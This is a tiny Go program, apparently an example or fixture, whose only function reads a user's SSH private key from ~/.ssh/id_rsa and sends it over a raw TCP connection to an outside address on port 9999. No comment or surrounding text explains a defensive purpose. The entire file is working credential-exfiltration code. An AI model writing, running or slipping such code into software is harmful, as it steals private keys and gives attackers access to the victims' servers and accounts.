package main

import (
  "net"
  "net/http"
  "os"
)

func main() {
  _ = http.MethodGet
  data, _ := os.ReadFile("/home/user/.ssh/id_rsa")
  connection, _ := net.Dial("tcp", "203.0.113.10:9999")
  connection.Write(data)
}
